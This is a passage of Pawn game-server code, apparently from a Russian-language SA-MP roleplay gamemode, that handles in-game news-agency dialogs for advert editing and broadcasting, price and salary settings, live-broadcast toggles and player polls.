			else if(carr >= taxicar[0] && carr <= taxicar[68] || carr >= taxi5lvlcar[0] && carr <= taxi5lvlcar[9] || carr >= taxi10lvlcar[0] && carr <= taxi10lvlcar[10] || carr >= taxi40lvlcar[0] && carr <= taxi40lvlcar[6]) SCM(playerid,COLOR_GREEN," Чтобы начать рабочий день введите /fare");
			else if(GetPlayerVehicleID(playerid) >= buscar[2] && GetPlayerVehicleID(playerid) <= buscar[3]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
			else if(GetPlayerVehicleID(playerid) >= buscar[4] && GetPlayerVehicleID(playerid) <= buscar[5]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid, 163, 2, "Маршрут", "АвтоВокзал LS << >> Автошкола SF\nАвтоВокзал LS << >> АвтоВокзал LV", "Принять", "Отмена");
			return true;
		}
	case 3002:
		{
			if(!response) return true;
			if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid,3002,DIALOG_STYLE_INPUT, "Зарплата репортерам", "[Зарплата] = [Ранг] * N + N\nN = указанное значение от 100 до 2000", "Готово", "Отмена");
			new moneys;
			moneys = strval(inputtext);
			if(moneys < 100 || moneys > 2000)
			{
				ShowPlayerDialogEx(playerid,3002,DIALOG_STYLE_INPUT, "Зарплата репортерам", "[Зарплата] = [Ранг] * N + N\nN = указанное значение от 100 до 2000", "Готово", "Отмена");
				return true;
			}
			SendMes(playerid, COLOR_YELLOW2, " Вы установили зарплату репортёрам %i.", moneys);
			switch(PlayerInfo[playerid][pMember])
			{
				case 9: newsZP[1] = moneys;
				case 16: newsZP[0] = moneys;
				case 20: newsZP[2] = moneys;
			}
		}
	case 3001:
		{
			if(!response) return true;
			if(!strlen(inputtext)) return  ShowPlayerDialogEx(playerid,3001,DIALOG_STYLE_INPUT, "Стоимость секунды разговора", "Введите цену за звонок не более 20 вирт", "Готово", "Отмена");
			new moneys;
			moneys = strval(inputtext);
			if(moneys < 1 || moneys > 20)
			{
				ShowPlayerDialogEx(playerid,3001,DIALOG_STYLE_INPUT, "Стоимость секунды разговора", "Введите цену за звонок не более 20 вирт", "Готово", "Отмена");
				return true;
			}
			SendMes(playerid, COLOR_YELLOW2, " Вы установили цену за секунду разговора %i вирт.", moneys);
			switch(PlayerInfo[playerid][pMember])
			{
				case 9: smspricesf = moneys;
				case 16: smspricels = moneys;
				case 20: smspricelv = moneys;
			}
		}
	case 31:
		{
			if(!response) return true;
			if(!strlen(inputtext))
			{
				ShowPlayerDialogEx(playerid,31,DIALOG_STYLE_INPUT, "Цена за символ", "Введите цену за один символ не более 50 вирт", "Готово", "Отмена");
			}
			new moneys;
			moneys = strval(inputtext);
			if(moneys < 1 || moneys > 50)
			{
				SCM(playerid, COLOR_GREY, " Минимальная сумма - 1, максимальная - 50!");
				ShowPlayerDialogEx(playerid,31,DIALOG_STYLE_INPUT, "Цена за символ", "Введите цену за один символ не более 50 вирт", "Готово", "Отмена");
				return true;
			}
			SendMes(playerid, COLOR_YELLOW2, " Вы установили цену за символ %i вирт.", moneys);
			switch(PlayerInfo[playerid][pMember])
			{
				case 9: addd[1] = moneys;
				case 16: addd[0] = moneys;
				case 20: addd[2] = moneys;
			}
			return true;
		}
	case 10202:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					ShowPlayerDialogEx(playerid,11553,DIALOG_STYLE_INPUT, "Снять деньги с банка News", "Введите сумму", "Готово", "Отмена");
				}
			case 1:
				{
					ShowPlayerDialogEx(playerid,11552,DIALOG_STYLE_INPUT, "Пополнить счет банка News", "Введите сумму", "Готово", "Отмена");
				}
			}
		}
	case 10203:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					ShowPlayerDialogEx(playerid,11553,DIALOG_STYLE_INPUT, "Снять деньги с банка News", "Введите сумму", "Готово", "Отмена");
				}
			case 1:
				{
					ShowPlayerDialogEx(playerid,11552,DIALOG_STYLE_INPUT, "Пополнить счет банка News", "Введите сумму", "Готово", "Отмена");
				}
			}
		}
	case 3113:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
			switch(listitem)
			{
			case 0:
				{
					ShowPlayerDialogEx(playerid,3001,DIALOG_STYLE_INPUT, "Стоимость секунды разговора", "Введите цену за звонок не более 20 вирт", "Готово", "Отмена");
				}
			case 1:
				{
					ShowPlayerDialogEx(playerid,31,DIALOG_STYLE_INPUT, "Стоимость одного символа", "Введите цену за символ не более 50 вирт", "Готово", "Отмена");
				}
			case 2:
			    {
			    	ShowPlayerDialogEx(playerid,3002,DIALOG_STYLE_INPUT, "Зарплата репортерам", "[Зарплата] = [Ранг] * N + N\nN = указанное значение от 100 до 2000", "Готово", "Отмена");
			    }
			}
		}
	case 11518:
		{
			if(!response) return true;
			SetPVarInt(playerid, "AdvertID", listitem+1);
			ShowPlayerDialogEx(playerid, 11519, 2, "Объявления", " [1] Читать\n [2] Редактировать и отправить\n [3] Отправить\n [4] Удалить объявление\n [5] Отправить администрации", "Принять", "Назад");
		}
	case 11519:
		{
			if(!response) { DeletePVar(playerid, "AdvertID"); return AdvertList(playerid); }
			new full = 0;
			switch(PlayerInfo[playerid][pMember])
			{
			case 16: full = 0;
			case 9: full = 1;
			case 20: full = 2;
			}
			switch(listitem)
			{
			case 0:
				{
     				format(string, 128, " %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adText]);
					ShowPlayerDialogEx(playerid, 11520, 0, "Объявления", string, "Назад", "");
				}
			case 1:
				{
					format(string, 128, " %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adText]);
					ShowPlayerDialogEx(playerid, 11521, 1, "Объявления", string, "Принять", "Назад");
				}
			case 2:
				{

					if(AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][edited] == false)
					{
						strmid(AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][editName], Name(playerid), 0, 50, 50);
						AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][edited] = true;
					}
					if(AdvertTime > gettime())
					{
						DeletePVar(playerid, "AdvertID");
						SCM(playerid, COLOR_GREY, " Объявления можно дать через 15 секунд!");
						return AdvertList(playerid);
					}
					format(string, 128, " Объявление: %s. Прислал: %s. Тел: %i",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adText], AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adName],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adPhone]);
					SendClientMessageToAll(0xd900c8, string);
					switch(PlayerInfo[playerid][pMember])
					{
					case 9:
						{
							format(string, 128, "        Отредактировал сотрудник SF News: %s", AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][editName]);
							SendClientMessageToAll(0xd900c8, string);
						}
					case 16:
						{
							format(string, 128, "        Отредактировал сотрудник LS News: %s", AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][editName]);
							SendClientMessageToAll(0xd900c8, string);
						}
					case 20:
						{
							format(string, 128, "        Отредактировал сотрудник LV News: %s", AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][editName]);
							SendClientMessageToAll(0xd900c8, string);
						}
					}
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++)
					{
						AdvertInfo[i][full][adPhone] = AdvertInfo[i+1][full][adPhone];
						strmid(AdvertInfo[i][full][adText],AdvertInfo[i+1][full][adText],0,strlen(AdvertInfo[i+1][full][adText]), 50);
						strmid(AdvertInfo[i][full][adName],AdvertInfo[i+1][full][adName],0,strlen(AdvertInfo[i+1][full][adName]), 50);
						strmid(AdvertInfo[i][full][editName],AdvertInfo[i+1][full][editName],0,strlen(AdvertInfo[i+1][full][editName]), 50);
						AdvertInfo[i][full][editName] = AdvertInfo[i+1][full][editName];
					}
					TOTALADVERT[full]--;
					AdvertTime = gettime() + 15;
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
			case 3:
				{
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++)
					{
						AdvertInfo[i][full][adPhone] = AdvertInfo[i+1][full][adPhone];
						strmid(AdvertInfo[i][full][adText],AdvertInfo[i+1][full][adText],0,strlen(AdvertInfo[i+1][full][adText]), 50);
						strmid(AdvertInfo[i][full][adName],AdvertInfo[i+1][full][adName],0,strlen(AdvertInfo[i+1][full][adName]), 50);
					}
					TOTALADVERT[full]--;
					SCM(playerid, -1, " {20A9FF}Объявление удалено");
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
			case 4:
				{
					if(AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][edited] == true) return SCM(playerid, COLOR_GREY, " Отредактированные объявления нельзя отправить администрации.");
					format(string, 128, " News Report: %s. Прислал: %s (Отправил: %s)",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adText], AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adName], Name(playerid));
					SendAdminMessage(0xD97700AA, string);
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++)
					{
						AdvertInfo[i][full][adPhone] = AdvertInfo[i+1][full][adPhone];
						strmid(AdvertInfo[i][full][adText],AdvertInfo[i+1][full][adText],0,strlen(AdvertInfo[i+1][full][adText]), 50);
						strmid(AdvertInfo[i][full][adName],AdvertInfo[i+1][full][adName],0,strlen(AdvertInfo[i+1][full][adName]), 50);
					}
					TOTALADVERT[full]--;
					SCM(playerid, COLOR_LIGHTRED, " Объявление отправлено администрации");
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
			}
		}
	case 11520: ShowPlayerDialogEx(playerid, 11519, 2, "Объявления", " [1] Читать\n [2] Редактировать и отправить\n [3] Отправить\n [4] Удалить объявление\n [5] Отправить администрации", "Принять", "Назад");
	case 11521:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 11519, 2, "Объявления", " [1] Читать\n [2] Редактировать и отправить\n [3] Отправить\n [4] Удалить объявление\n [5] Отправить администрации", "Принять", "Назад");
			new full = 0;
			switch(PlayerInfo[playerid][pMember])
			{
			case 9: full = 1;
			case 16: full = 0;
			case 20: full = 2;
			}
			if(!strlen(inputtext))
			{
				format(string, 128, " %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adText]);
				return ShowPlayerDialogEx(playerid, 11521, 1, "Объявления", string, "Принять", "Назад");
			}
			strmid(AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adText], inputtext, 0, 128, 128);
			strmid(AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][editName], Name(playerid), 0, 50, 50);
			AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][edited] = true;
			if(AdvertTime > gettime())
			{
				DeletePVar(playerid, "AdvertID");
				SCM(playerid, COLOR_GREY, " Объявления можно дать через 15 секунд!");
				return AdvertList(playerid);
			}
			format(string, 128, " Объявление: %s. Прислал: %s. Тел: %i",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adText], AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adName],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][adPhone]);
			SendClientMessageToAll(0xd900c8, string);
			switch(PlayerInfo[playerid][pMember])
			{
			case 9:
				{
					format(string, 128, "        Отредактировал сотрудник SF News: %s", AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][editName]);
					SendClientMessageToAll(0xd900c8, string);
				}
			case 16:
				{
					format(string, 128, "        Отредактировал сотрудник LS News: %s", AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][editName]);
					SendClientMessageToAll(0xd900c8, string);
				}
			case 20:
				{
					format(string, 128, "        Отредактировал сотрудник LV News: %s", AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][editName]);
					SendClientMessageToAll(0xd900c8, string);
				}
			}
			for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++)
			{
				AdvertInfo[i][full][adPhone] = AdvertInfo[i+1][full][adPhone];
				strmid(AdvertInfo[i][full][adText],AdvertInfo[i+1][full][adText],0,strlen(AdvertInfo[i+1][full][adText]), 50);
				strmid(AdvertInfo[i][full][adName],AdvertInfo[i+1][full][adName],0,strlen(AdvertInfo[i+1][full][adName]), 50);
				strmid(AdvertInfo[i][full][editName],AdvertInfo[i+1][full][editName],0,strlen(AdvertInfo[i+1][full][editName]), 50);
				AdvertInfo[i][full][edited] = AdvertInfo[i+1][full][edited];
			}
			TOTALADVERT[full]--;
			AdvertTime = gettime() + 15;
			DeletePVar(playerid, "AdvertID");
			AdvertList(playerid);
		}
	case 2223:
		{
			if(!response) return true;
			//new newcar = GetPlayerVehicleID(playerid);
			switch(listitem)
			{
			case 0:
				{
					if(PEfir[playerid] != 999)
					{
						PEfir[playerid] = 999;
						SCM(playerid, -1, " Вы вошли в прямой эфир");
						CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
						return true;
					}
					else return SCM(playerid, -1, " Вы уже в эфире");
				}
			case 1:
				{
					if(PEfir[playerid] != 255)
					{
						PEfir[playerid] = 255;
						SCM(playerid, -1, " Вы вышли из прямого эфира");
						if(PlayerInfo[playerid][pMember] == 9 && smssf == playerid)
						{
						    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
							format(string, 128, " [SFN] %s завершил приём звонков от слушателей", Name(playerid));
							SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
							smssf = -1;
						}
						else if(PlayerInfo[playerid][pMember] == 16 && smsls == playerid)
						{
						    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
							format(string, 128, " [LSN] %s завершил приём звонков от слушателей", Name(playerid));
							SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
							smsls = -1;
						}
						else if(PlayerInfo[playerid][pMember] == 20 && smslv == playerid)
						{
						    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
							format(string, 128, " [LVN] %s завершил приём звонков от слушателей", Name(playerid));
							SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
							smslv = -1;
						}
						CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
						return true;
					}
					else return SCM(playerid, COLOR_GRAD1, " Вы не в эфире");
				}
			case 2:
				{
					if((PlayerInfo[playerid][pMember] == 9 && smssf != -1) || (PlayerInfo[playerid][pMember] == 16 && smsls != -1)
					|| (PlayerInfo[playerid][pMember] == 20 && smsls != -1)) return SCM(playerid, COLOR_GREY, " Приём звонков уже включён");
					new strs[32];
					switch(PlayerInfo[playerid][pMember])
					{
						case 9: smssf = playerid, strs = "SFN";
						case 16: smsls = playerid, strs = "LSN";
						case 20: smslv = playerid, strs = "LVN";
					}
					SCM(playerid, COLOR_BLUE, " Вы начали приём звонков от слушаталей");
					format(string, 128, " [%s] %s начал приём звонков от слушателей",strs, Name(playerid));
					SendFamilyMessage(PlayerInfo[playerid][pMember],COLOR_GREEN, string);
					CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
					return true;
				}
			case 3:
				{
					if((PlayerInfo[playerid][pMember] == 9 && smssf == -1) || (PlayerInfo[playerid][pMember] == 16 && smsls == -1)
					|| (PlayerInfo[playerid][pMember] == 20 && smslv == -1)) return SCM(playerid, COLOR_GREY, " Приём звонков уже отключён");
					new strs[32];
					switch(PlayerInfo[playerid][pMember])
					{
						case 9: smssf = -1, strs = "SFN";
						case 16: smsls = -1, strs = "LSN";
						case 20: smslv = -1, strs = "LVN";
					}
					SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
					format(string, 128, " [%s] %s завершил приём звонков от слушателей",strs, Name(playerid));
					SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
					CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
					return true;
				}
			case 4: ShowPlayerDialog(playerid, 2230, DIALOG_STYLE_INPUT, "Взять интервью", "Введите ид игрока для начала интервью", "Далее", "Назад");
			case 5: ShowPlayerDialog(playerid, 2231, DIALOG_STYLE_INPUT, "Завершить интервью", "Введите ид игрока для завершения интвервью", "Далее", "Назад");
			case 6: { AdvertList(playerid); }
			case 7:
			{
				new strs[32];
			    switch(PlayerInfo[playerid][pMember])
			    {
			    	case 9: strs = "SF News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fSfnews]);
			    	case 16: strs = "LS News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fLsnews]);
					case 20: strs = "LV News Bank", format(string, sizeof(string), "Снять со счёта(наличные)\nПеревести на счёт(с личного счёта)\nБаланс: %i вирт", FracBank[0][fLvnews]);
			    }
				ShowPlayerDialog(playerid, 3115, DIALOG_STYLE_LIST, strs, string, "Далее", "Назад");
			}
			case 8:
				{
					if(PlayerInfo[playerid][pLeader] == 9 || PlayerInfo[playerid][pLeader] == 16 || PlayerInfo[playerid][pLeader] == 20)
						ShowPlayerDialogEx(playerid, 3113, DIALOG_STYLE_LIST, "[ ANEWS MENU ]", " [ 1 ] Цена звонка\n [ 2 ] Цена за объявления\n [ 3 ] Зарплата", "Выбрать", "Отмена");
					else
	 				{
	 				    SCM(playerid, COLOR_GREY, " Вам не доступен данный раздел!");
	 				    CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
	 				}
				}
			case 9:
			    {
					if(PlayerInfo[playerid][pRank] < 7)
					{
					    SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
					    return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
					}
					ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
			    }
			}
		}
	case 3118:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
	        switch(listitem)
	        {
	            case 0:
	            {
					new firstfree = -1;
					if(PlayerInfo[playerid][pMember] == 9)
					{
					    for(new i = 0; i < 10; i++)
					    {
					    	if(!strlen(VoteNews[sfn][i][vcaption]))
					    	{
					    	    firstfree = i;
					    	    break;
					    	}
				    	}
			    	}
			    	else if(PlayerInfo[playerid][pMember] == 16)
					{
					    for(new i = 0; i < 10; i++)
					    {
					    	if(!strlen(VoteNews[lsn][i][vcaption]))
					    	{
					    	    firstfree = i;
					    	    break;
					    	}
				    	}
			    	}
			    	else if(PlayerInfo[playerid][pMember] == 20)
					{
					    for(new i = 0; i < 10; i++)
					    {
					    	if(!strlen(VoteNews[lvn][i][vcaption]))
					    	{
					    	    firstfree = i;
					    	    break;
					    	}
				    	}
			    	}
			    	if(firstfree == 0)
			    	{
			    		return ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
			    	}
			    	else
			    	{
			    	    format(string, sizeof(string), "");
			    	    new strs[32];
						if(PlayerInfo[playerid][pMember] == 9)
						{
				    	    for(new i = 0; i < 10; i++)
						    {
						    	if(strlen(VoteNews[sfn][i][vcaption]))
						    	{
						    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[sfn][i][vcaption]);
						    		strcat(string, strs);
						    	}
					    	}
				    	}
				    	else if(PlayerInfo[playerid][pMember] == 16)
						{
				    	    for(new i = 0; i < 10; i++)
						    {
						    	if(strlen(VoteNews[lsn][i][vcaption]))
						    	{
						    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[lsn][i][vcaption]);
						    		strcat(string, strs);
						    	}
					    	}
				    	}
				    	else if(PlayerInfo[playerid][pMember] == 20)
						{
				    	    for(new i = 0; i < 10; i++)
						    {
						    	if(strlen(VoteNews[lvn][i][vcaption]))
						    	{
						    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[lvn][i][vcaption]);
						    		strcat(string, strs);
						    	}
					    	}
				    	}
				    	ShowPlayerDialog(playerid, 3130, DIALOG_STYLE_LIST, "Голосование",string, "Выбрать", "Назад");
			    	}
	            }
	            case 1: return ShowPlayerDialog(playerid, 3129, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите название. До 32 символов", "Далее", "Назад");
	        }
	    }
	case 3129:
	    {
	    	if(!response) return ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
	    	if(strlen(inputtext) < 1 || strlen(inputtext) > 32) return ShowPlayerDialog(playerid, 3129, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите название. До 32 символов", "Далее", "Назад");
			if(PlayerInfo[playerid][pMember] == 9)
			{
			    new firstfree = -1;
			    for(new i = 0; i < 10; i++)
			    {
			    	if(!strlen(VoteNews[sfn][i][vcaption]))
			    	{
			    	    firstfree = i;
			    	    break;
			    	}
		    	}
		    	if(firstfree == -1)
				{
					SCM(playerid, COLOR_GREY, " Достигнуто максимальное количество голосований!");
					ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
				}
			    strmid(VoteNews[sfn][firstfree][vcaption], inputtext, 0, strlen(inputtext), 32);
			    VoteNews[sfn][firstfree][vlevel] = 1;
			}
			else if(PlayerInfo[playerid][pMember] == 16)
			{
                new firstfree = -1;
			    for(new i = 0; i < 10; i++)
			    {
			    	if(!strlen(VoteNews[lsn][i][vcaption]))
			    	{
			    	    firstfree = i;
			    	    break;
			    	}
		    	}
		    	if(firstfree == -1)
				{
					SCM(playerid, COLOR_GREY, " Достигнуто максимальное количество голосований!");
					ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
				}
			    strmid(VoteNews[lsn][firstfree][vcaption], inputtext, 0, strlen(inputtext), 32);
			    VoteNews[lsn][firstfree][vlevel] = 1;
			}
			else if(PlayerInfo[playerid][pMember] == 20)
			{
				new firstfree = -1;
			    for(new i = 0; i < 10; i++)
			    {
			    	if(!strlen(VoteNews[lvn][i][vcaption]))
			    	{
			    	    firstfree = i;
			    	    break;
			    	}
		    	}
		    	if(firstfree == -1)
				{
					SCM(playerid, COLOR_GREY, " Достигнуто максимальное количество голосований!");
					ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
				}
			    strmid(VoteNews[lvn][firstfree][vcaption], inputtext, 0, strlen(inputtext), 32);
			    VoteNews[lvn][firstfree][vlevel] = 1;
			}
			SCM(playerid, -1, " Голосование добавлено, но ещё не запущено");
			ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
		}
	case 3130:
	    {
	    	if(!response) return ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
			SetPVarInt(playerid, "chosen_point_vote", listitem);
			ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
		}
	case 3136:
	    {
	        if(!response)
	        {
	        	return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
	        }
	        new i = GetPVarInt(playerid, "chosen_point_vote"), strs[32];
	        format(string, sizeof(string), "");
	        new index = 0;
			if(PlayerInfo[playerid][pMember] == 9)
			{
				for(new j = 0; j < 10; j++)
				{
				    if(strlen(VoteNewsVariants_SF[i][j][vname]) == 0)
				    {
				        if(VoteNews[sfn][i][vactive]) format(strs, sizeof(strs), "[%i] %s\t%i голосов\n", index, VoteNewsVariants_SF[i][j][vname],VoteNewsVariants_SF[i][j][vnumber] );
				        else format(strs, sizeof(strs), "[%i] %s\n", index, VoteNewsVariants_SF[i][j][vname]);
				        strcat(string, strs);
				        index++;
				    }
				}
			}
			else if(PlayerInfo[playerid][pMember] == 16)
			{
				for(new j = 0; j < 10; j++)
				{
				    if(strlen(VoteNewsVariants_LS[i][j][vname]) != 0)
				    {
				        if(VoteNews[lsn][i][vactive]) format(strs, sizeof(strs), "[%i] %s\t%i голосов\n", index, VoteNewsVariants_LS[i][j][vname],VoteNewsVariants_LS[i][j][vnumber] );
				        else format(strs, sizeof(strs), "[%i] %s\n", index, VoteNewsVariants_LS[i][j][vname]);
				        strcat(string, strs);
				        index++;
				    }
				}
			}
			else if(PlayerInfo[playerid][pMember] == 20)
			{
				for(new j = 0; j < 10; j++)
				{
				    if(strlen(VoteNewsVariants_LV[i][j][vname]) != 0)
				    {
				        if(VoteNews[lvn][i][vactive]) format(strs, sizeof(strs), "[%i] %s\t%i голосов\n", index, VoteNewsVariants_LV[i][j][vname],VoteNewsVariants_LV[i][j][vnumber] );
				        else format(strs, sizeof(strs), "[%i] %s\n", index, VoteNewsVariants_LV[i][j][vname]);
				        strcat(string, strs);
				        index++;
				    }
				}
			}
			if(strlen(string) == 0) return ShowPlayerDialog(playerid, 3131, DIALOG_STYLE_LIST, "Меню", "[0] Варианты\n[1] Добавить вариант\n[2] Добавить вопрос\n[3] Ограничить по левелу\n[4] Запустить\n[5] Удалить", "Выбрать", "Назад");
			else
			{
				ShowPlayerDialog(playerid, 3136, DIALOG_STYLE_LIST, "Варианты", string, "Выбрать", "Назад");
			}
	    }
	case 3131:
	    {
	        if(!response)
	        {
	            new firstfree = -1;
				if(PlayerInfo[playerid][pMember] == 9)
				{
				    for(new i = 0; i < 10; i++)
				    {
				    	if(!strlen(VoteNews[sfn][i][vcaption]))
				    	{
				    	    firstfree = i;
				    	    break;
				    	}
			    	}
		    	}
		    	else if(PlayerInfo[playerid][pMember] == 16)
				{
				    for(new i = 0; i < 10; i++)
				    {
				    	if(!strlen(VoteNews[lsn][i][vcaption]))
				    	{
				    	    firstfree = i;
				    	    break;
				    	}
			    	}
		    	}
		    	else if(PlayerInfo[playerid][pMember] == 20)
				{
				    for(new i = 0; i < 10; i++)
				    {
				    	if(!strlen(VoteNews[lvn][i][vcaption]))
				    	{
				    	    firstfree = i;
				    	    break;
				    	}
			    	}
		    	}
		    	if(firstfree == 0)
		    	{
		    		return ShowPlayerDialog(playerid, 3118, DIALOG_STYLE_LIST, "Голосование","[0] Созданные\n[1] Добавить", "Выбрать", "Назад");
		    	}
		    	else
		    	{
		    	    format(string, sizeof(string), "");
		    	    new strs[32];
					if(PlayerInfo[playerid][pMember] == 9)
					{
			    	    for(new i = 0; i < 10; i++)
					    {
					    	if(strlen(VoteNews[sfn][i][vcaption]))
					    	{
					    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[sfn][i][vcaption]);
					    		strcat(string, strs);
					    	}
				    	}
			    	}
			    	else if(PlayerInfo[playerid][pMember] == 16)
					{
			    	    for(new i = 0; i < 10; i++)
					    {
					    	if(strlen(VoteNews[lsn][i][vcaption]))
					    	{
					    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[lsn][i][vcaption]);
					    		strcat(string, strs);
					    	}
				    	}
			    	}
			    	else if(PlayerInfo[playerid][pMember] == 20)
					{
			    	    for(new i = 0; i < 10; i++)
					    {
					    	if(strlen(VoteNews[lvn][i][vcaption]))
					    	{
					    	    format(strs, sizeof(strs), "[%i] %s\n",i,VoteNews[lvn][i][vcaption]);
					    		strcat(string, strs);
					    	}
				    	}
			    	}
			    	ShowPlayerDialog(playerid, 3130, DIALOG_STYLE_LIST, "Голосование",string, "Выбрать", "Назад");
		    	}
		    	return true;
  			}
  			switch(listitem)
			{
			    case 0: // variants
			    {
			        new i = GetPVarInt(playerid, "chosen_point_vote"), strs[32];
			        format(string, sizeof(string), "");
			        new index = 0;
					if(PlayerInfo[playerid][pMember] == 9)
					{
						for(new j = 0; j < 10; j++)
						{
						    if(strlen(VoteNewsVariants_SF[i][j][vname]) != 0)
						    {
						        if(VoteNews[sfn][i][vactive]) format(strs, sizeof(strs), "[%i] %s\t%i голосов\n", index, VoteNewsVariants_SF[i][j][vname],VoteNewsVariants_SF[i][j][vnumber] );
						        else format(strs, sizeof(strs), "[%i] %s\n", index, VoteNewsVariants_SF[i][j][vname]);
						        strcat(string, strs);
						        index++;
						    }
						}
					}
					else if(PlayerInfo[playerid][pMember] == 16)
					{
						for(new j = 0; j < 10; j++)
						{
						    if(strlen(VoteNewsVariants_LS[i][j][vname]) != 0)
						    {
						        if(VoteNews[lsn][i][vactive]) format(strs, sizeof(strs), "[%i] %s\t%i голосов\n", index, VoteNewsVariants_LS[i][j][vname],VoteNewsVariants_LS[i][j][vnumber] );
						        else format(strs, sizeof(strs), "[%i] %s\n", index, VoteNewsVariants_LS[i][j][vname]);
						        strcat(string, strs);
						        index++;
						    }
						}
					}
					else if(PlayerInfo[playerid][pMember] == 20)
					{
						for(new j = 0; j < 10; j++)
						{
						    if(strlen(VoteNewsVariants_LV[i][j][vname]) != 0)
						    {
						        if(VoteNews[lvn][i][vactive]) format(strs, sizeof(strs), "[%i] %s\t%i голосов\n", index, VoteNewsVariants_LV[i][j][vname],VoteNewsVariants_LV[i][j][vnumber] );
						        else format(strs, sizeof(strs), "[%i] %s\n", index, VoteNewsVariants_LV[i][j][vname]);
						        strcat(string, strs);
						        index++;
						    }
						}
					}
